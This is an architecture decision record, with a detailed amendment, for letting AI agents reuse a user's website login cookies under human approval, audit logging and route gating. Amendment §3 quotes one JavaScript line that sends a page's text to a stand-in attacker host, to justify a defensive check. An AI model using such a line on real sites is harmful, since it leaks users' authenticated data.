---
adr: 028
title: "Agent web authentication via cookie sharing"
status: accepted
date: 2026-05-22
axis: knowledge
deciders: [Mike]
consulted: [Ark, CC]
informed: []
depends_on: []
related: [ADR-029]
supersedes: []
---

# ADR-028: Agent Web Authentication via Cookie Sharing

**Authors:** Ark, CC (review)
**Scope:** dpc-client (Rust + Python + UI)
**Amended:** 2026-09-11 — the per-agent domain whitelist (§6), the Tauri WebView popup login
(§1, §3) and the hardcoded eTLD+1 map (§4) are all gone from the code. A recorded human
approval in the vault is the gate now. See the amendment below; the superseded passages are
kept where they are, each marked.

<!-- Status and date moved into the front matter above, 2026-08-10, when --check began
     reading docs/decisions/. This was the one file between 027 and 039 without it. -->


## Context

Agents need READ-only access to authenticated web services on behalf of the user (e.g., example.com order history, example.net account data). Currently, `browser.py` tools (`browse_page`, `fetch_json`) make anonymous HTTP requests with no authentication capability.

Three approaches were considered in backlog AGENT-WEB-AUTH:
- **(A) OAuth2** — correct but many target services (example.com, example.net) lack public OAuth endpoints
- **(B) Cookie Sharing** — user logs in via Tauri WebView popup, cookies stored and reused by agent
- **(C) Browser Automation** — powerful but resource-heavy and fragile

**Decision: (B) Cookie Sharing** as MVP, with abstraction layer for future (A)/(C) pluggability.

### Current State (code-verified)

| Component | Status | Detail |
|-----------|--------|--------|
| `browser.py` | Anonymous only | `requests.get` without cookies; Camoufox fallback triggered by `needs_js` heuristic (`len(text) < 200`) |
| `Cargo.toml` | No cookie extraction | Only `tauri-plugin-opener/dialog/fs/notification` — no WebView cookie API |
| `privacy_rules.json` | Per-tool gating only | `agent_profiles.{id}.tools` = `{tool_name: bool}` — no domain-level granularity |
| Encrypted storage | None | All config files (personal.json, providers.json) are plaintext; RSA keys stored without additional encryption |
| Audit logging | None | `firewall.py` has `logger.debug` for config-load only; no tool-call audit trail |

## Decision

### 1. Authentication Flow

> **Superseded 2026-09-11.** The Tauri WebView popup was deleted in `c2cfab07` (2026-06-05,
> "ADR-029 Task 008 — remove Tauri login popup, add per-request headless auth gate"). The
> login window is now a headed Camoufox window opened by the agent tool `open_login_window`
> (`dpc_agent/tools/browser.py`), and what it produces is not only cookies but an **approval**
> recorded beside them. See the amendment below.

```
Agent: "I need access to example.com. Open login window?"
  ↓ user confirms
Tauri command: open_login_window("example.com")
  → Tauri WebView popup (cross-platform — WebView2/WKWebView/WebKitGTK abstracted by Tauri runtime)
  → user logs in manually
  → popup closes → cookies extracted via Tauri native cookies API
  ↓
Cookies stored in encrypted vault per-agent per-domain
  ↓
Agent notified: "authenticated for example.com"
  ↓
Agent: browse_page(url="https://example.com/my/orders", use_auth="example.com")
  → Camoufox launched with planted cookies in profile
  → page content returned to agent
```

### 2. Cookie Storage (Credential Vault)

**Location:** `~/.dpc/agents/{agent_id}/web_credentials.enc` (encrypted blob, not JSON)

**Format:**
```json
{
  "domains": {
    "example.com": {
      "cookies": [
        {"name": "session_id", "value": "...", "domain": ".example.com", "path": "/", "expires": 1748000000, "secure": true, "httponly": true}
      ],
      "authenticated_at": "2026-05-22T17:30:00Z",
      "last_used_at": "2026-05-22T17:35:00Z"
    }
  }
}
```

> **Amended 2026-09-11 — a third field, and the two older ones do not mean what the names
> promise.** A jar now also carries `"approved": {"at", "via"}` (`web_auth.py`). The separation
> is the point: cookies are bytes a browser writes for itself, approval is a decision, and they
> are written by different functions. `authenticated_at` is stamped on **every**
> `web_auth.save_cookies` call, and an ordinary browser close routes through it, so it says
> when the bytes were written and never when a human logged in — board
> `THE-VAULT-STAMPS-A-FRESH-LOGIN-EVERY-TIME-THE-BROWSER-CLOSES`.

**Encryption:** Windows DPAPI via `keyring` crate (Rust-side) / `keyring` library (Python-side). Key derived from OS user account, no additional password prompt. Trade-off: same-user attacker can decrypt. Acceptable for Alpha. Master password option deferred to Phase 2.

**Per-agent isolation:** Each agent has separate vault. Even if two agents authenticate on same domain, cookie jars are independent.

### 3. Cookie Extraction (Tauri Rust)

> **Superseded 2026-09-11.** None of this section is live: `web_auth.rs` (192 lines, the whole
> file) and the three `web_auth_*` Tauri commands went in `c2cfab07`. Cookies are read from the
> Playwright context of the Camoufox login window instead
> (`AuthBrowser.capture_login_cookies`). Kept for the record of why a native WebView API looked
> like the cheap path.

**Tauri 2.x provides native cross-platform cookies API** (discovered during T2 spike, S138 2026-05-23). No per-OS WinRT/WKWebView/WebKitGTK bindings needed — Tauri runtime abstracts the underlying WebView per platform.

**API surface** (`tauri::webview::WebviewWindow`, available since Tauri 2.9.5 — our current Cargo.lock pin):

```rust
pub fn cookies(&self) -> Result<Vec<Cookie<'static>>>
pub fn cookies_for_url(&self, url: Url) -> Result<Vec<Cookie<'static>>>
pub fn set_cookie(&self, cookie: Cookie<'_>) -> Result<()>
pub fn delete_cookie(&self, cookie: Cookie<'_>) -> Result<()>
```

`Cookie` type re-exported from `cookie` crate (transitive dep, no addition to `Cargo.toml` needed).

**Estimated ~50-100 lines Rust total** (down from per-platform ~200-300 estimate).

**Implementation pattern:** close-event + spawn-thread. `on_window_event(WindowEvent::CloseRequested)` spawns a separate thread (avoids Windows deadlock on sync handlers) that calls `cookies_for_url()` and emits the `web_auth_login_complete` Tauri event. Frontend forwards via existing WebSocket to Python vault (T3).

**Tauri command signatures** (already scaffolded at `dpc-client/ui/src-tauri/src/web_auth.rs`):

```rust
#[tauri::command]
pub async fn web_auth_open_login_window(domain: String) -> Result<Vec<Cookie>, String>;

#[tauri::command]
pub async fn web_auth_get_status(domain: String) -> Result<AuthStatus, String>;

#[tauri::command]
pub async fn web_auth_revoke(domain: String) -> Result<(), String>;
```

### 4. eTLD+1 Cookie Resolution

Cookies are stored and matched by **eTLD+1** (effective Top-Level Domain plus one), not exact domain.

- `login.example.com` → eTLD+1 = `example.com`
- `www.example.com` → eTLD+1 = `example.com`
- `api.example.com` → eTLD+1 = `example.com`

For MVP: hardcoded eTLD+1 map for supported domains. For Phase 2: Mozilla Public Suffix List integration.

All cookies for eTLD+1 and its subdomains are included in authenticated requests.

> **Done 2026-09-11, and the MVP shortcut was worse than "hardcoded".** The map was twelve
> entries with **passthrough**: every host it did not know came back unchanged, so
> `use_auth="com"` resolved to `com` and made every `.com` site one jar — board
> `RESOLVE-ETLD1-IS-THE-IDENTITY-FUNCTION-FOR-EVERY-REAL-DOMAIN`. `web_auth.resolve_etld1` is
> now a real Public Suffix List resolver over a vendored list
> (`dpc-client/core/dpc_client_core/data/public_suffix_list.dat`, 334 129 bytes, new and
> untracked as of 2026-09-11) and returns **`None`** — never the input — for anything that is
> not a registrable domain: a bare public suffix, a single label, an IP literal, an
> unparseable string. `web_auth.save_cookies` raises on such a value rather than keying a jar
> with it.

### 5. Camoufox as Primary Transport for Auth

**Critical design decision:** When `use_auth=domain` is specified, requests ALWAYS go through Camoufox, never through plain `requests.get`.

**Rationale (code-verified):** Current Camoufox fallback in `browser.py` triggers on `len(text) < 200` heuristic. Auth challenge responses from example.com/example.net often exceed 200 chars ("please log in" pages), so the heuristic will NOT trigger Camoufox. Even with correct cookies, plain HTTP will fail due to:
- TLS fingerprinting
- JavaScript challenges
- Browser behavior checks

**Routing logic:**
```
if use_auth specified AND cookie vault has non-expired cookies for domain:
    → Camoufox with planted cookies in profile
elif use_auth specified BUT no/empty cookies:
    → Error: "re-login required for {domain}"
else:
    → existing browse_page logic (HTTP → Camoufox fallback)
```

**Cookie planting in Camoufox:** Export cookies from vault → write to Camoufox profile's `cookies.sqlite` → launch browser → extract content.

### 6. Firewall Extension: Domain-Level Gating

> **Void since 2026-09-10 — this whole section describes a mechanism that no longer exists.**
> `agent_profiles.<id>.web_auth.allowed_domains` is not read, not written and not present in
> any profile; `ContextFirewall.get_agent_web_auth_domains` is deleted (the uncommitted
> working-tree diff of `firewall.py` removes it), and `_BACKEND_OWNED_PROFILE_KEYS` in
> `service.py` — which existed to keep the editor from overwriting that key — is now
> `frozenset()`, with the reason written above it. What replaced it is in the amendment below.
> Kept in place because the whitelist's failure is the argument for what came after it.

**Current schema** (`privacy_rules.json`):
```json
"agent_profiles": {
  "agent_001": {
    "tools": {"browse_page": true, ...},
    "sandbox_extensions": [...]
  }
}
```

**New block** (per-agent, alongside existing `tools` and `sandbox_extensions`):
```json
"agent_profiles": {
  "agent_001": {
    "tools": {"browse_page": true, ...},
    "sandbox_extensions": [...],
    "web_auth": {
      "allowed_domains": ["example.com", "example.org"],
      "permissions": "read_only"
    }
  }
}
```

~~**Enforcement:** `use_auth=domain` parameter in `browse_page`/`fetch_json` is validated against `web_auth.allowed_domains` for the calling agent. If domain not in whitelist → tool call rejected with "domain not authorized".~~

> **Replaced 2026-09-11.** `use_auth` is validated against the vault instead: it is resolved to
> a registrable domain, and the call is refused unless `web_auth.is_approved(agent_id, etld1)`
> finds a recorded approval — audit status `auth_denied:no_approved_login`, or
> `auth_denied:not_a_domain` when the value names no registrable domain (`browse_page` in
> `dpc_agent/tools/browser.py`). `fetch_json` still has no `use_auth` parameter; the code says
> so at that gate, and says that if it ever gains one the check is to be hoisted into a shared
> helper rather than copied.

**`permissions: "read_only"`** is the only value for MVP. WRITE permission is explicitly out of scope. Agent tools cannot perform POST/PUT/DELETE with auth cookies.

### 7. Audit Trail

**New file:** `~/.dpc/agents/{agent_id}/web_audit.jsonl`

**Format:**
```jsonl
{"timestamp": "2026-05-22T17:42:00Z", "agent_id": "agent_001", "domain": "example.com", "url": "https://example.com/my/orders", "method": "GET", "status": 200, "bytes": 45230}
```

**Properties:**
- Append-only, no rotation in MVP
- Not tied to knowledge commit chain — separate audit stream
- Agent cannot write to this file directly (tool-level restriction)
- Readable by user via future UI panel (Phase 2)

### 8. Cookie Replacement Semantic

On re-authentication (user opens login popup again for same domain): **REPLACE** entire cookie jar for eTLD+1.

**Rationale:** Old session is expired. Merging risks leaving stale cookies that confuse server-side session logic. Clean replacement is simpler and safer.

### 9. Expiry Handling

When cookies are expired (checked against `expires` timestamp):
- Tool call returns error: "Cookies for example.com expired. Ask user to re-login."
- Agent notifies user: "My access to example.com has expired. Open login window again?"
- No auto-popup — user must explicitly trigger re-auth (transparent, no surprise)

## Implementation Phases

### Phase 1 (MVP)
1. ~~Rust: `open_login_window` Tauri command (cross-platform via Tauri native cookies API, since 2.9.5)~~ — **deleted in `c2cfab07`** (`web_auth.rs`, 192 lines, whole file); the name survives as a **Python agent tool** with a different body, not a Tauri command
2. Rust: DPAPI-encrypted credential vault read/write
3. Python: `web_auth.py` module — vault access, cookie resolution, eTLD+1 matching
4. Python: `browser.py` extension — `use_auth` parameter, Camoufox-with-cookies routing
5. ~~Python: firewall validation — `web_auth.allowed_domains` check~~ — **removed 2026-09-10**, replaced by the vault-approval check (§6 note above)
6. Python: `web_audit.jsonl` append on every auth request
7. ~~UI: "Login" button in chat (agent-initiated, user-approved)~~ — **removed in `c2cfab07`** together with the Web Authentication section of the permissions panel; the agent tool `open_login_window` is the entry point now
8. ~~`privacy_rules.json`: `web_auth` block for agent_001~~ — **removed 2026-09-10**; no profile carries a `web_auth` block

### Phase 2 (Future)
- Master password encryption option
- Audit trail UI panel
- OAuth2 driver for services that support it
- ~~Public Suffix List for eTLD+1 resolution~~ — **done 2026-09-11**, see the §4 note
- Cookie health monitoring (expiry warnings)

### Phase 3 (Future)
- Browser automation driver (Selenium/Playwright via Camoufox)
- WRITE permissions with per-action user confirmation
- Multi-session support (multiple accounts per domain)

## Risks

| Risk | Severity | Mitigation |
|------|----------|------------|
| Tauri cookies API flagged unstable in upstream docs | Low | Currently on Tauri 2.9.5 (API present since this version); monitor 2.10+ changelog; pin to `"2.9"` if breaking change appears |
| Windows sync deadlock on `cookies()` call | Low | All Tauri commands use `async fn` and close-event handler spawns a separate thread before calling `cookies_for_url()` — pattern documented in T2 impl |
| Anti-bot evolution may break Camoufox+cookies approach | Medium | Cookie replant + Camoufox profile reset; fallback to re-login |
| DPAPI same-user attacker can decrypt vault | Low (Alpha) | Acceptable for Alpha; master password option in Phase 2 |
| eTLD+1 edge cases (co.uk, etc.) | Low — **realised, 2026-08/09** | Hardcoded MVP domains; PSL integration Phase 2. The severity was wrong: the map's *passthrough* made every unknown host its own jar and `com` a jar for all of `.com`. Closed 2026-09-11 by the vendored PSL (§4 note) |
| example.com/example.net DOM changes break content extraction | Medium | Agent-side resilience; user can re-trigger extraction |

## Consequences

**Positive:**
- Agents can access real user data (orders, deliveries, feeds)
- Per-agent isolation preserves multi-agent security model
- Audit trail provides after-the-fact visibility
- Foundation for future OAuth2 / browser automation drivers

**Negative:**
- Full session access (not granular per-page) — READ-only scope mitigates
- Platform-specific Rust code increases maintenance surface
- Cookie expiry creates UX friction (re-login prompts)
- First encrypted storage in the system — sets precedent for future secrets

## Amendment 2026-09-11 — the whitelist is gone; a recorded approval is the gate

**Decided by Mike, 2026-09-11**, in the team chat, on a reviewer's point that §6 and the
Phase 1 list still prescribe a mechanism deleted from the code — so "the next person who opens
the ADR reads a cancelled world". Board entry:
`THE-DECISION-RECORD-STILL-SPECIFIES-THE-WEB-AUTH-GATE-THAT-WAS-DELETED`.

The body above is kept as written and each void passage carries a pointer here, following
ADR-032's amendment of 2026-09-07: a decision that was reversed should show both states rather
than only the last one. The discarded option is the argument for what replaced it, so deleting
it would cost this file the one thing it exists for.

Everything below was read in the working tree of 2026-09-11. The `firewall.py`, `service.py`,
`browser.py` and `web_auth.py` changes are **uncommitted**, and a parallel task was editing
`browser.py` and `web_auth.py` while this was written — `browser.py` grew by several hundred
lines between the first and second reading. Code is therefore cited **by symbol, not by line**:
a line number taken that afternoon was already wrong by the evening. `c2cfab07` (2026-06-05) is
on `dev`.

### 1. What authorises an authenticated fetch now

Three checks, in this order, all inside `browse_page` (`dpc_agent/tools/browser.py`):

1. **The value must name a registrable domain.** `web_auth.resolve_etld1(use_auth)` returns
   `None` rather than the input for a public suffix, a bare label, an IP literal or an
   unparseable string; the call is refused with audit status `auth_denied:not_a_domain`.
2. **The vault must hold a recorded human approval for that domain** —
   `web_auth.is_approved(agent_id, etld1)`, refused with `auth_denied:no_approved_login` and a
   message naming which domains *are* approved. **Cookies alone are not authorisation**: the
   ordinary navigate/close writeback creates and refreshes a jar, so a jar proves the agent has
   been somewhere, not that anyone agreed to it.
3. **Headless additionally asks a person, per request** — the ADR-029 Task 008 gate, unchanged,
   with audit statuses `headless_approved` / `headless_rejected` / `headless_no_ui`.

Check 2 is new and is the replacement for §6. It applies to **headed and headless alike**; only
check 3 distinguishes them. The code states why at that gate: `keep_open=True` spends a stored
login exactly as headless does, and a window being visible does not make the account's owner the
one who chose to spend it.

The audit token `auth_denied:no_approved_login` is the one a reader should grep for. It replaces
the "domain not authorized" of §6 and an intermediate `auth_denied:no_vault_jar` that existed
for part of 2026-09-11 and is already gone — the board entry that opened this amendment still
names that intermediate token.

### 2. Logging in and spending a login are two different operations

A new agent tool `open_login_window(domain, timeout_sec)` opens a **headed** Camoufox window
with a clean profile — no `storage_state`, no vault cookies, and a route gate scoped to the one
site (`AuthBrowser._start_clean` is true for a login window, an anonymous session, or a session
with no scope at all). The human types the password there; `AuthBrowser.capture_login_cookies`
polls the live context and writes what appears, because the human closing the window is exactly
the case where `close()` finds the context already dead.

It is registered with `default_enabled=False` (its `ToolEntry` in `browser.py`), per the S148
rule in CLAUDE.md: it puts a password prompt on the user's screen and is the one act that can
create an approval.

**Writing cookies and recording the approval are two functions, deliberately.**
`web_auth.save_cookies` writes bytes; `web_auth.record_approval` writes a human's yes onto an
existing jar and **takes no cookie argument at all** — its docstring gives the reason: "an
approval that arrives together with a cookie snapshot is one a browser can mint by loading a
page". `AuthBrowser._sync_cookies_to_vault` calls `save_cookies` without `approved_via`, so no
path that writes cookie bytes can create an approval. See §5: this split is the repair of a
defect found on the first live run, and at the time of writing `record_approval` had no caller
in the tree.

### 3. The route gate now constrains the destination, not only the initiator

The eTLD+1 allowlist alone renders real sites blank, because a site's own bundle lives on hosts
it never names (`x.com` boots from `abs.twimg.com`). In `AuthBrowser._domain_route_gate`, a
**GET/HEAD subresource** — never a navigation — passes when both ends are constrained: the
initiating frame is inside the allowlist **and** the host being contacted is one this site's
manifest names. Constraining only the initiator would leave
`new Image().src = "https://evil.tld/?d=" + document.body.innerText` carrying data out in a URL,
and `<script src>` running foreign code inside the authenticated origin; the reason is written
at that gate.

The manifest is `~/.dpc/web_cdn_manifest.json` — **node level, deliberately outside every
agent's sandbox** — merged with a small in-code seed (`web_auth.CDN_MANIFEST_SEED`, exact hosts
only, never suffixes: `*.twimg.com` would reopen by pattern what the allowlist closes by name).
Refused hosts are folded into `web_cdn_refusals.json` per agent by
`web_auth.record_cdn_refusals`, read by the UI that asks the human and by nothing on the
request path. **A refusal authorises nothing**; promotion into the manifest is a separate
act (`web_auth.promote_cdn_refusals`). This is the same shape as the vault split above: the
thing an agent can write is never the thing that grants.

The file was called `web_cdn_observed.json` until 2026-09-11, when the word went back to meaning
only the backlog's observation shelf ([GLOSSARY.md](../GLOSSARY.md)). `web_auth` reads the old
name when the new one is absent or unreadable and folds it into the new file on the next write,
so a record a human was meant to promote from survives the rename; the old file is never deleted.

### 4. Why the whitelist could not be the gate

`web_auth.save_cookies` stamps `authenticated_at` on every call and every ordinary browser close
routes through it, so the field that was read as "when a human last logged in" was being written
by the agent's own traffic. Measured and recorded on the board
(`THE-VAULT-STAMPS-A-FRESH-LOGIN-EVERY-TIME-THE-BROWSER-CLOSES`, 2026-09-11): agent_001's
`x.com` jar read `authenticated_at 2026-09-10T17:49:02Z`, and the audit row at exactly that
second is `close | x.com | ok` — an ordinary close, not a login. *That measurement is reported
from the board, not re-run here; the unconditional stamp itself was read in the code.*

That is why the `approved` block exists as a separate field rather than as a reading of the
cookies: **cookies are data a browser writes for itself; approval is a decision.** The
whitelist, a third list that could only ever narrow what the other two already permitted, was
removed in the same change.

**One honesty note belongs here, because the board carries it and this document should not
read as a clean story:** the argument for deleting the whitelist rested on a premise that was
plausible, load-bearing and unmeasured, and the reviewer who supplied it retracted it the same
evening — board `NOTHING-ASKS-WHICH-PREMISE-UNDER-A-DECISION-CARRIES-A-MEASUREMENT`. The
mechanism above is what the code does today; whether the deletion was justified at the moment it
was made is that entry's question, not this section's answer.

### 5. What this amendment does **not** claim to have settled

- **The clean-profile premise was false, and the repair is in flight.** `open_login_window`'s
  docstring stated it: "the only way cookies for `domain` can appear in it is that the human
  typed the password — their appearance IS the approval". On the first live run, 2026-09-11, a
  site that hands any visitor anonymous cookies on first contact (`guest_id`, `gt`, `__cf_bm`)
  minted an approval 24 seconds in, on a logged-out page — *reported from that run, not
  reproduced here*. The premise is now disowned in the code itself: `record_approval` "takes no
  cookie argument on purpose", and the login window's own summary says a jar of guest cookies
  and a jar carrying a real session "both take the same route to the same question, and only the
  answer grants". Approval is being moved to an explicit human answer over the existing UI
  approval channel. **At the last reading, `record_approval` had no caller: the receiving half
  of that channel was not yet wired. Not finished — do not read this section as done.**
- **`browser_state.json` is a second store of logins that no approval governs.** It holds the
  cookies of every site the session's scope covered, is rewritten after every navigate and at
  close, and is plaintext — `chmod 0600` runs under `if os.name == "posix"` only, so on Windows
  it inherits the directory ACL. Nothing in it carries an `approved` field, and the vault gate
  does not read it. Two things verified in the 2026-09-11 tree narrow the board's description:
  a session with no scope now starts clean and carries no identity, and `_save_storage_state`
  refuses to write for an anonymous or unscoped session. The other half of board entry
  `A-HEADED-SESSION-OPENED-WITHOUT-USE-AUTH-INSTALLS-NO-ROUTE-GATE-AND-STILL-LOADS-EVERY-COOKIE`
  — session reuse deciding reuse without comparing the domain argument — was **not** checked
  here. The two-store question is older than today:
  `LIST-AUTH-DOMAINS-REPORTS-ON-A-STORE-THAT-NO-LONGER-RECEIVES-LOGINS` and
  `KEYS-AND-API-TOKENS-LIE-IN-PLAINTEXT-WITH-DEFAULT-PERMISSIONS`.
- **The suite that guards all of this was falsified and leaked** — board
  `THE-NEW-WEB-AUTH-TESTS-SURVIVE-THE-DELETION-OF-WHAT-THEY-ARE-NAMED-FOR`: four deliberate
  breakages out of fourteen left the suite green. Nothing in this amendment should be read as
  "verified by tests".

### 6. Unchanged by this amendment

§2's location and encryption (`~/.dpc/agents/{agent_id}/web_credentials.enc`, Fernet with the
key in keyring — §2 above says "DPAPI", which is what `keyring` uses as its Windows backend, not
what the file format is), §7's audit trail (`web_audit.jsonl`, now with rotation), §8's
replace-the-whole-jar semantic, and the READ-only scope.

---

## Review

- **CC (S137):** Verify-pass against code: all 6 review points hold; 2 additional findings (firewall schema gap, Camoufox-as-primary routing) incorporated. 9 clarifying questions on T1-T8 task decomposition resolved.
- **Ark (S137):** Proposal author. Expanded proposal per review findings; answered all clarifying questions; agreed on design details (DPAPI via Python `keyring`, parallel AuthBrowser path, drop `fetch_json+use_auth` from MVP, separate `is_auth_domain_allowed()` firewall function, audit hook inside `web_auth.py`, separate `tools/web_auth_tools.py` module, inline ChatPanel login button).
- **Mike (S137):** Approved scope (variant B / READ-only / Tauri WebView popup). MVP domain list: `example.com` (marketplace orders) + `example.org` (grocery orders); extensible via config without code changes. Design details accepted after team Discussion.

### Resolved Discussion Items

> **Read with the amendment above, 2026-09-11.** Three rows resolve to things that no longer
> exist: **#11** (`is_auth_domain_allowed`) was deleted with the whitelist, **#14** (inline
> ChatPanel login button) went with the UI in `c2cfab07`, and **#1**'s "config-driven,
> extensible" domain list is exactly the config that was removed. #3 (`list_auth_domains`),
> #4, #5, #12 and #13 still describe live code.

| # | Question | Resolution |
|---|----------|------------|
| 1 | MVP domains | `example.com`, `example.org` — config-driven, extensible |
| 2 | Camoufox cookie planting mechanism | Spike (T1) gate before T4 implementation |
| 3 | Agent domain discovery | New tool `list_auth_domains()` returns `[{domain, has_cookies, expires}]` |
| 4 | WRITE prevention enforcement | Restricted `AuthBrowser` wrapper exposes only `goto(url)` + `get_page_content()` |
| 5 | Audit file write protection | DPC core process (`web_auth.py`) writes; agent has no write access |
| 6 | T1 spike done-criteria | Camoufox + planted cookies for `login.example.com` → `example.com/my/orders` renders as logged-in |
| 7 | T2 IPC mechanism | Existing WebSocket `local_api.py`, new command `web_auth_login_complete` |
| 8 | DPAPI library | Python `keyring` package (cross-platform abstraction; DPAPI on Windows) |
| 9 | AuthBrowser integration | Parallel to existing `_browse_with_camoufox`, triggered only when `use_auth` param present |
| 10 | `fetch_json+use_auth` in MVP | Out of scope — only `browse_page` supports `use_auth` |
| 11 | Firewall validation surface | New `is_auth_domain_allowed(agent_id, domain)`, separate from `is_tool_allowed()` |
| 12 | Audit hook location | Inside `web_auth.py` after successful auth-request |
| 13 | `list_auth_domains` module placement | `tools/web_auth_tools.py` (separate from `browser.py`) |
| 14 | UI panel placement | Inline in `ChatPanel.svelte` (agent-initiated flow, not settings) |
